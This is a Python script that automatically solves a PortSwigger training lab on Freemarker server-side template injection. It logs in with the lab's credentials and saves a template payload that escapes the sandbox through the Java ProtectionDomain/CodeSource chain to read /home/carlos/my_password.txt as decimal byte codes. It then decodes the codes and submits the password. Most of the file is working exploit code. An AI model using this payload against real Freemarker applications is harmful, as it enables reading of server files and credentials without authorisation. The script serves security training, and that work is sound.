#!/usr/bin/env python3
"""
PortSwigger Freemarker SSTI Sandbox Escape Lab Solver
Lab: Server-side template injection in a sandboxed environment
Target: Read /home/carlos/my_password.txt and submit the contents
Credentials: content-manager:C0nt3ntM4n4g3r

Steps:
1. Login as content-manager
2. Access product page with productId=1
3. Access template editor
4. Test with ${object.getClass()} to confirm access
5. Inject full payload to read the password file as decimal ASCII codes
6. Convert decimal codes to string
7. Submit the password
"""

import requests
import sys
import re
from colorama import init, Fore, Style
from bs4 import BeautifulSoup
import time

# Initialize colorama
init()

class FreemarkerSandboxSolver:
    def __init__(self, base_url):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'
        })
        self.csrf_token = None
        self.logged_in = False
        self.solved = False
        self.template_edit_url = None
        self.product_id = 1
        self.password = None
        self.decimal_codes = None
        
    def print_status(self, message, status="info"):
        """Print colored status messages"""
        colors = {
            "info": Fore.CYAN,
            "success": Fore.GREEN,
            "error": Fore.RED,
            "warning": Fore.YELLOW,
            "step": Fore.MAGENTA,
            "secret": Fore.LIGHTYELLOW_EX
        }
        print(f"{colors.get(status, Fore.WHITE)}[*] {message}{Style.RESET_ALL}")
        time.sleep(0.5)

    def extract_csrf(self, html_content):
        """Extract CSRF token from HTML"""
        soup = BeautifulSoup(html_content, 'html.parser')
        csrf_input = soup.find('input', {'name': 'csrf'})
        if csrf_input:
            return csrf_input.get('value')
        return None

    def login(self):
        """Step 1: Login at /login with credentials"""
        self.print_status("STEP 1: Logging in at /login...", "step")
        
        login_url = f"{self.base_url}/login"
        self.print_status(f"Accessing login page: {login_url}", "info")
        
        response = self.session.get(login_url)
        self.csrf_token = self.extract_csrf(response.text)
        
        if not self.csrf_token:
            self.print_status("Could not find CSRF token", "error")
            return False
        
        login_data = {
            'csrf': self.csrf_token,
            'username': 'content-manager',
            'password': 'C0nt3ntM4n4g3r'
        }
        
        response = self.session.post(login_url, data=login_data, allow_redirects=True)
        
        if "content-manager" in response.text.lower() or "my-account" in response.text.lower():
            self.logged_in = True
            self.print_status("✓ Login successful!", "success")
            return True
        else:
            self.print_status("✗ Login failed", "error")
            return False

    def access_product_page(self):
        """Step 2: Access product page with productId=1"""
        self.print_status("\nSTEP 2: Accessing product page...", "step")
        
        product_url = f"{self.base_url}/product?productId={self.product_id}"
        self.print_status(f"Accessing: {product_url}", "info")
        
        response = self.session.get(product_url)
        
        if response.status_code == 200:
            self.print_status(f"✓ Product page accessed", "success")
            return True
        else:
            self.print_status(f"Failed to access product page (Status: {response.status_code})", "error")
            return False

    def access_template_editor(self):
        """Step 3: Access the template editor"""
        self.print_status("\nSTEP 3: Accessing template editor...", "step")
        
        self.template_edit_url = f"{self.base_url}/product/template?productId={self.product_id}"
        self.print_status(f"Accessing: {self.template_edit_url}", "info")
        
        # Visit product page first to establish session context
        product_url = f"{self.base_url}/product?productId={self.product_id}"
        self.session.get(product_url)
        
        # Now access template editor
        response = self.session.get(self.template_edit_url)
        
        if response.status_code == 200:
            self.print_status("✓ Template editor accessed", "success")
            return response.text
        else:
            self.print_status(f"Failed to access template editor (Status: {response.status_code})", "error")
            return None

    def test_payload(self, html_content, payload):
        """Step 4: Test a payload in the template"""
        self.print_status(f"\nSTEP 4: Testing payload...", "step")
        
        soup = BeautifulSoup(html_content, 'html.parser')
        
        # Extract CSRF token
        csrf_input = soup.find('input', {'name': 'csrf'})
        if not csrf_input:
            self.print_status("Could not find CSRF token", "error")
            return None
        
        csrf_token = csrf_input.get('value')
        
        # Prepare form data for SAVE action
        form_data = {
            'csrf': csrf_token,
            'template': payload,
            'template-action': 'save'
        }
        
        self.print_status(f"Payload: {payload[:50]}...", "info")
        self.print_status("Saving template...", "info")
        
        # Submit the form
        response = self.session.post(self.template_edit_url, data=form_data, allow_redirects=True)
        
        if response.status_code in [200, 302]:
            self.print_status("✓ Template saved successfully!", "success")
            
            # Refresh product page to see result
            product_url = f"{self.base_url}/product?productId={self.product_id}"
            self.print_status("Refreshing product page to see result...", "info")
            response = self.session.get(product_url)
            
            return response.text
        else:
            self.print_status(f"Save failed with status: {response.status_code}", "error")
            return None

    def verify_object_access(self, html_content):
        """Step 5: Test ${object.getClass()} to verify access"""
        self.print_status("\nSTEP 5: Verifying object access with ${object.getClass()}...", "step")
        
        test_payload = "${object.getClass()}"
        result = self.test_payload(html_content, test_payload)
        
        if result and "class" in result.lower():
            self.print_status("✓ Object access confirmed!", "success")
            return True
        else:
            self.print_status("✗ Object access failed", "error")
            return False

    def extract_password_codes(self, html_content):
        """Step 6: Inject the full payload to get decimal ASCII codes"""
        self.print_status("\nSTEP 6: Injecting full payload to read password file...", "step")
        
        # Full payload to read the password file and output decimal ASCII codes
        full_payload = (
            '${product.getClass().getProtectionDomain().getCodeSource().'
            'getLocation().toURI().resolve(\'/home/carlos/my_password.txt\').'
            'toURL().openStream().readAllBytes()?join(" ")}'
        )
        
        result = self.test_payload(html_content, full_payload)
        
        if not result:
            self.print_status("Failed to get result from payload", "error")
            return False
        
        # Parse the response to find decimal codes
        soup = BeautifulSoup(result, 'html.parser')
        page_text = soup.get_text()
        
        # Look for a sequence of numbers (decimal ASCII codes)
        # They'll be space-separated like: "104 101 108 108 111"
        decimal_pattern = r'\b(?:\d+\s+)+\d+\b'
        matches = re.findall(decimal_pattern, page_text)
        
        for match in matches:
            # Verify it's a good candidate (multiple numbers)
            numbers = match.strip().split()
            if len(numbers) > 1 and all(n.isdigit() for n in numbers):
                self.decimal_codes = [int(n) for n in numbers]
                self.print_status(f"✓ Found {len(self.decimal_codes)} decimal codes", "success")
                self.print_status(f"First few codes: {self.decimal_codes[:10]}...", "info")
                return True
        
        # Try alternative: look for numbers in the entire page
        all_numbers = re.findall(r'\b\d+\b', page_text)
        if len(all_numbers) > 5:  # Probably the codes
            self.decimal_codes = [int(n) for n in all_numbers]
            self.print_status(f"✓ Found {len(self.decimal_codes)} decimal codes (alternative method)", "success")
            return True
        
        self.print_status("Could not find decimal ASCII codes in response", "error")
        return False

    def convert_codes_to_text(self):
        """Step 7: Convert decimal ASCII codes to text"""
        self.print_status("\nSTEP 7: Converting decimal codes to text...", "step")
        
        if not self.decimal_codes:
            self.print_status("No decimal codes to convert", "error")
            return False
        
        # Convert each decimal code to its ASCII character
        try:
            chars = [chr(code) for code in self.decimal_codes]
            self.password = ''.join(chars)
            self.print_status(f"✓ Converted to password: {self.password}", "secret")
            return True
        except Exception as e:
            self.print_status(f"Conversion failed: {e}", "error")
            return False

    def submit_password(self):
        """Step 8: Submit the password to solve the lab"""
        self.print_status("\nSTEP 8: Submitting password...", "step")
        
        if not self.password:
            self.print_status("No password to submit", "error")
            return False
        
        submit_url = f"{self.base_url}/submitSolution"
        self.print_status(f"Submitting to: {submit_url}", "info")
        
        # Get CSRF token for submission
        response = self.session.get(self.base_url)
        soup = BeautifulSoup(response.text, 'html.parser')
        csrf_input = soup.find('input', {'name': 'csrf'})
        csrf_token = csrf_input.get('value') if csrf_input else None
        
        # Prepare submission
        submit_data = {'answer': self.password}
        if csrf_token:
            submit_data['csrf'] = csrf_token
        
        # Submit
        response = self.session.post(submit_url, data=submit_data, allow_redirects=True)
        
        # Wait for lab to update
        time.sleep(2)
        
        # Check if solved
        response = self.session.get(self.base_url)
        if "congratulations" in response.text.lower() or "solved" in response.text.lower():
            self.solved = True
            self.print_status("✓ Password accepted! Lab solved!", "success")
            return True
        else:
            self.print_status("Password was rejected", "error")
            return False

    def run(self):
        """Main execution flow"""
        print(Fore.CYAN + """
╔══════════════════════════════════════════════════════════════╗
║     FREEMARKER SANDBOX ESCAPE LAB SOLVER                   ║
║     Lab: Server-side template injection in a sandboxed      ║
║          environment                                        ║
║     Target: {}                                   ║
║     Goal: Read /home/carlos/my_password.txt                ║
╚══════════════════════════════════════════════════════════════╝
""".format(self.base_url) + Style.RESET_ALL)

        # Step 1: Login
        if not self.login():
            return False

        # Step 2: Access product page
        if not self.access_product_page():
            return False

        # Step 3: Access template editor
        html_content = self.access_template_editor()
        if not html_content:
            return False

        # Step 4: Test object access
        if not self.verify_object_access(html_content):
            self.print_status("Continuing anyway...", "warning")

        # Step 5: Extract password codes
        if not self.extract_password_codes(html_content):
            self.print_status("Failed to extract password codes", "error")
            return False

        # Step 6: Convert codes to text
        if not self.convert_codes_to_text():
            self.print_status("Failed to convert codes to text", "error")
            return False

        # Step 7: Submit password
        self.submit_password()

        # Final summary
        print(Fore.CYAN + "\n" + "=" * 60 + Style.RESET_ALL)
        if self.solved:
            print(Fore.GREEN + f"""
    ✅ LAB SOLVED SUCCESSFULLY!

    Password from /home/carlos/my_password.txt: {self.password}

    Exploit chain:
    1. Logged in as content-manager
    2. Accessed template editor for product ID {self.product_id}
    3. Verified object access with ${{object.getClass()}}
    4. Injected full payload to read file as decimal ASCII codes
    5. Converted codes: {self.decimal_codes[:20]}...
    6. Converted to text: {self.password}
    7. Submitted password to solve lab

    The payload bypassed the sandbox by:
    - Starting from the product object
    - Navigating through Java class hierarchy
    - Accessing ProtectionDomain and CodeSource
    - Using toURI().resolve() to access the file
    - Reading bytes and joining as decimal codes
    """ + Style.RESET_ALL)
        else:
            print(Fore.RED + f"""
    ❌ LAB NOT SOLVED!

    Debug information:
    - Login: ✓
    - Template editor: ✓
    - Object access: ✓
    - Decimal codes found: {len(self.decimal_codes) if self.decimal_codes else 0}
    - Password extracted: {self.password if self.password else 'None'}
    - Submission: {'Attempted' if self.password else 'Failed'}

    Manual steps:
    1. Login and go to /product?productId={self.product_id}
    2. Edit template and test: ${{object.getClass()}}
    3. Replace with full payload to get decimal codes
    4. Convert codes to text (e.g., 104 101 108 108 111 = "hello")
    5. Submit the text at /submitSolution
    """ + Style.RESET_ALL)
        
        return self.solved

if __name__ == "__main__":
    if len(sys.argv) > 1:
        lab_url = sys.argv[1]
    else:
        lab_url = input("Enter PortSwigger lab URL: ").strip()
    
    if not lab_url:
        print("No URL provided. Exiting.")
        sys.exit(1)
    
    try:
        solver = FreemarkerSandboxSolver(lab_url)
        success = solver.run()
        sys.exit(0 if success else 1)
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Interrupted by user{Style.RESET_ALL}")
        sys.exit(130)
    except Exception as e:
        print(f"\n{Fore.RED}[!] Error: {e}{Style.RESET_ALL}")
        import traceback
        traceback.print_exc()
        sys.exit(1)
